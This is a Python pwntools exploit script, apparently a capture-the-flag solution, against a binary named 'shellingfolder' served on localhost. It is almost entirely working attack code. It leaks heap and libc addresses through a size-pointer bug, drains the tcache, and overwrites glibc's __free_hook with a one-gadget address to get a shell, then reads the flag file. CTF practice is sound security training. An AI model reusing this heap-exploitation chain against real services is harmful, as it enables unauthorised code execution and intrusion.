#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./shellingfolder"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

diff_mainarena_printf = 0x386dc0
offset_printf = libc.symbols["printf"]
offset_mainarena_libc = diff_mainarena_printf + offset_printf
offset_onegadget = 0x4f322

def change_folder(conn,name):
  conn.recvuntil("Your choice:")
  conn.sendline("2")
  conn.recvuntil("Choose a Folder :")
  conn.sendline(name)

def list_folder(conn):
  conn.recvuntil("Your choice:")
  conn.sendline("1")

def make_folder(conn,name):
  conn.recvuntil("Your choice:")
  conn.sendline("3")
  conn.recvuntil("Name of Folder:")
  conn.send(name)

def make_file(conn,name,size):
  conn.recvuntil("Your choice:")
  conn.sendline("4")
  conn.recvuntil("Name of File:")
  conn.send(name)
  conn.recvuntil("Size of File:")
  conn.sendline(str(size))

def remove_file(conn,name):
  conn.recvuntil("Your choice:")
  conn.sendline("5")
  conn.recvuntil("Choose a Folder or file :")
  conn.send(name)

def calc_size(conn):
  conn.recvuntil("Your choice:")
  conn.sendline("6")

def exploit(conn):

  #leak address of somewhre in the heap
  make_file(conn,"A"*0x18,0)
  calc_size(conn)     #read ptr into size
  conn.recvuntil("A"*0x18)
  addr1 = unpack(conn.recvuntil(" : ")[:-3].ljust(8,"\x00"))
  addr2 = addr1-0x78      #0x78=offset of size member in the structure
  heapbase = addr2-0x10   #0x10=metadata of the chunk(size,prevsize)
  print("heapbase: "+hex(heapbase))

  #create file whose size_ptr refers to...
  #(-0xe8 = offset between interested *children)
  make_file(conn,("B"*0x18)+p64(heapbase+0x18)[:-1],-0xe8) #dont know why [:-1]'s needed  

  #consume tcache
  for i in range(7):
    make_file(conn,"A"*(i+1),0)
  for i in range(7):
    remove_file(conn,"A"*(i+1)+"\n")
  
  #this chunk's fwd refers to main_arena+96
  remove_file(conn,"A"*0x18+"\n")
 
  #set the pointer into B sothat Ican read fwd (sub 0xe8)
  calc_size(conn)

  #leak addr of main_arena+96
  #and calc some addr I need
  list_folder(conn)
  conn.recvline()
  main_arena96 = unpack(conn.recvline()[:-1].ljust(8,"\x00"))
  libc_base = main_arena96 - 96 - offset_mainarena_libc
  onegadget = libc_base + offset_onegadget

  #escape into clean folder
  make_folder(conn,"A")
  change_folder(conn,"A")
  
  #overwrite __free_hook into onegadget RCE by 2byte at once
  make_file(conn,"D"*0x18+p64(libc_base+libc.symbols["__free_hook"])[:-1],u16(p64(onegadget)[:2]))
  make_file(conn,"D"*0x18+p64(libc_base+libc.symbols["__free_hook"] + 2)[:-1],u16(p64(onegadget)[2:4]))
  make_file(conn,"D"*0x18+p64(libc_base+libc.symbols["__free_hook"] + 4)[:-1],u16(p64(onegadget)[4:6]))
  make_file(conn,"D"*0x18+p64(libc_base+libc.symbols["__free_hook"] + 6)[:-1],u16(p64(onegadget)[6:]))
  calc_size(conn)

  #use free() and go to onegadget RCE
  make_file(conn,"E",0)
  remove_file(conn,"E\n")
  
  #get the flag
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

